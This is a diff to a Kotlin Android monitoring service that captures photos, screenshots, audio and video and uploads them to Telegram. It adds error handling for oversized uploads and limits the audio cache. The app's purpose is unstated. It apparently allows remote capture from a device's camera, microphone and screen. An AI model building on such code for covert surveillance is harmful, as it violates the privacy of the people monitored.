@@ -4581,7 +4581,6 @@ class MonitoringService : Service() {
                                     }
                                 }
                                 MediaSendOutcome.KEPT -> {
-                                    try { preferencesManager.setLastPhotoHashSync(photoHashNow) } catch (_: Exception) { }
                                     prunePhotoCache()
                                     if (reportResult) {
                                         sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
@@ -4674,6 +4673,7 @@ class MonitoringService : Service() {
         val wd = serviceScope.launch {
             delay(45_000)
             if (shotAttempt.get() == shotSeq && shotBusy.compareAndSet(true, false)) {
+                shotAttempt.incrementAndGet()
                 android.util.Log.w("MonitoringService", "Screenshot watchdog: capture did not finish, flag reset")
                 if (reportResult) {
                     sendToTelegram("⚠️ Screenshot timed out without a response. Please try /screenshot again.")
@@ -5343,6 +5343,18 @@ private suspend fun ringDevice(seconds: Int) {
             sendToTelegram("Rate limited, audio delayed for retry.")
             return
         }
+        val pendingAudio = try { cacheDir.listFiles { f -> f.isFile && f.name.startsWith("audio_") && f.name.endsWith(".m4a") }?.size ?: 0 } catch (_: Exception) { 0 }
+        if (pendingAudio >= MAX_AUDIO_KEPT) {
+            try {
+                pruneAudioCache(MAX_AUDIO_KEPT - 1)
+            } catch (_: Exception) {
+            }
+            val pendingAudioNow = try { cacheDir.listFiles { f -> f.isFile && f.name.startsWith("audio_") && f.name.endsWith(".m4a") }?.size ?: 0 } catch (_: Exception) { 0 }
+            if (pendingAudioNow >= MAX_AUDIO_KEPT) {
+                sendToTelegram("Audio backlog full (offline). Oldest unsent discarded; newest recording skipped.")
+                return
+            }
+        }
         ensureForegroundTypes()
         val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + "_" + java.util.UUID.randomUUID() + ".m4a")
         var recorder: android.media.MediaRecorder? = null
@@ -5498,8 +5510,12 @@ private suspend fun ringDevice(seconds: Int) {
                 android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.DROPPED
-            }
-            return MediaSendOutcome.KEPT
+                } else if (response.code() == 413) {
+                android.util.Log.w("MonitoringService", "Audio too large (413), dropping file")
+                deleteQuietly(audioFile)
+                return MediaSendOutcome.DROPPED
+                }
+                return MediaSendOutcome.KEPT
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: Exception) {
@@ -5700,8 +5716,12 @@ private suspend fun ringDevice(seconds: Int) {
                 android.util.Log.w("MonitoringService", "Video rejected (400), dropping file")
                 deleteQuietly(videoFile)
                 return MediaSendOutcome.DROPPED
-            }
-            return MediaSendOutcome.KEPT
+                } else if (response.code() == 413) {
+                android.util.Log.w("MonitoringService", "Video too large (413), dropping file")
+                deleteQuietly(videoFile)
+                return MediaSendOutcome.DROPPED
+                }
+                return MediaSendOutcome.KEPT
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: Exception) {
@@ -6078,6 +6098,10 @@ private suspend fun ringDevice(seconds: Int) {
                     return MediaSendOutcome.KEPT
                 }
                 android.util.Log.w("MonitoringService", "Photo rejected (400), dropping file")
+                deleteQuietly(photoFile)
+                return MediaSendOutcome.DROPPED
+            } else if (response.code() == 413) {
+                android.util.Log.w("MonitoringService", "Photo too large (413), dropping file")
                 deleteQuietly(photoFile)
                 return MediaSendOutcome.DROPPED
             } else {
